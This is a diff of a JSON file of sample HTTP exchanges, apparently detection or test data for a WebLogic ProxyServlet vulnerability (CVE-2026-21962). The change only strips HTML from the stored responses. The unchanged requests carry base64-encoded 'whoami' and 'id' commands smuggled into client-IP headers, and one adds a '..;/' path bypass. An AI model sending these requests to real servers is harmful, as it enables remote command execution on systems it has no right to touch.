@@ -63,7 +63,7 @@
           }
         ],
         "request": "GET /bea_wls_internal/ProxyServlet HTTP/1.1\nHost: {{Hostname}}\nwl-proxy-client-ip: 127.0.0.1;Y21kOndob2FtaQ==\nproxy-client-ip: 127.0.0.1;Y21kOndob2FtaQ==\nx-forwarded-for: 127.0.0.1;Y21kOndob2FtaQ==\nUser-Agent: Mozilla/5.0 (compatible; Exploit/1.0)\nAccept: */*\nConnection: close\n",
-        "response": "HTTP/1.1 200 OK\nServer: WebLogic Server 14.1.1.0.0\n\n<title>Proxy Servlet</title>\n<h1>BEA WebLogic Server Proxy Servlet</h1>\n<p>Mode: <span style=\"color: red\">VULNERABLE (CVE-2026-21962)</span></p>\n",
+        "response": "HTTP/1.1 200 OK\nServer: WebLogic Server 14.1.1.0.0\n\nProxy Servlet\nBEA WebLogic Server Proxy Servlet\nMode: VULNERABLE (CVE-2026-21962)\n",
         "highlight": [
           "VULNERABLE (CVE-2026-21962)",
           "127.0.0.1;Y21kOndob2FtaQ=="
@@ -90,7 +90,7 @@
           }
         ],
         "request": "GET /bea_wls_internal/ProxyServlet HTTP/1.1\nHost: {{Hostname}}\nwl-proxy-client-ip: 127.0.0.1;Y21kOndob2FtaQ==\nproxy-client-ip: 127.0.0.1;Y21kOndob2FtaQ==\nx-forwarded-for: 127.0.0.1;Y21kOndob2FtaQ==\nUser-Agent: Mozilla/5.0\nAccept: */*\nConnection: close\n",
-        "response": "HTTP/1.1 200 OK\n\n<title>Proxy Servlet</title>\n<h1>BEA WebLogic Server Proxy Servlet</h1>\n<p>Mode: <span style=\"color: red\">VULNERABLE (CVE-2026-21962)</span></p>\n"
+        "response": "HTTP/1.1 200 OK\n\nProxy Servlet\nBEA WebLogic Server Proxy Servlet\nMode: VULNERABLE (CVE-2026-21962)\n"
       },
       {
         "id": 3,
@@ -105,7 +105,7 @@
           }
         ],
         "request": "GET /bea_wls_internal/ProxyServlet HTTP/1.1\nHost: {{Hostname}}\nwl-proxy-client-ip: 127.0.0.1;Y21kOndob2FtaQ==\nUser-Agent: Mozilla/5.0\nAccept: */*\nConnection: close\n",
-        "response": "HTTP/1.1 200 OK\n\n<title>Proxy Servlet</title>\n<h1>BEA WebLogic Server Proxy Servlet</h1>\n"
+        "response": "HTTP/1.1 200 OK\n\nProxy Servlet\nBEA WebLogic Server Proxy Servlet\n"
       },
       {
         "id": 4,
@@ -128,7 +128,7 @@
           }
         ],
         "request": "GET /console/..;/bea_wls_internal/ProxyServlet HTTP/1.1\nHost: {{Hostname}}\nwl-proxy-client-ip: 127.0.0.1;Y21kOndob2FtaQ==\nproxy-client-ip: 127.0.0.1;Y21kOndob2FtaQ==\nx-forwarded-for: 127.0.0.1;Y21kOndob2FtaQ==\nUser-Agent: Mozilla/5.0\nAccept: */*\nConnection: close\n",
-        "response": "HTTP/1.1 200 OK\n\n<title>Proxy Servlet</title>\n",
+        "response": "HTTP/1.1 200 OK\n\nProxy Servlet\n",
         "highlight": [
           "console/..;/bea_wls_internal",
           "127.0.0.1;Y21kOndob2FtaQ=="
@@ -155,7 +155,7 @@
           }
         ],
         "request": "GET /bea_wls_internal/ProxyServlet HTTP/1.1\nHost: {{Hostname}}\nwl-proxy-client-ip: 127.0.0.1;Y21kOmlk\nproxy-client-ip: 127.0.0.1;Y21kOmlk\nx-forwarded-for: 127.0.0.1;Y21kOmlk\nUser-Agent: Mozilla/5.0\nAccept: */*\nConnection: close\n",
-        "response": "HTTP/1.1 200 OK\n\n<title>Proxy Servlet</title>\n<pre>cmd:id</pre>\n",
+        "response": "HTTP/1.1 200 OK\n\nProxy Servlet\ncmd:id\n",
         "highlight": [
           "cmd:id",
           "127.0.0.1;Y21kOmlk",
@@ -170,7 +170,7 @@
         "method": "GET",
         "headers": [],
         "request": "GET /bea_wls_internal/ProxyServlet HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0\nAccept: */*\nConnection: close\n",
-        "response": "HTTP/1.1 401 Unauthorized\nWWW-Authenticate: Basic realm=\"WebLogic Server\"\n\n<title>401 Unauthorized</title>\n<h1>401 Unauthorized</h1>\n",
+        "response": "HTTP/1.1 401 Unauthorized\nWWW-Authenticate: Basic realm=\"WebLogic Server\"\n\n401 Unauthorized\n401 Unauthorized\n",
         "highlight": [
           "401 Unauthorized"
         ]
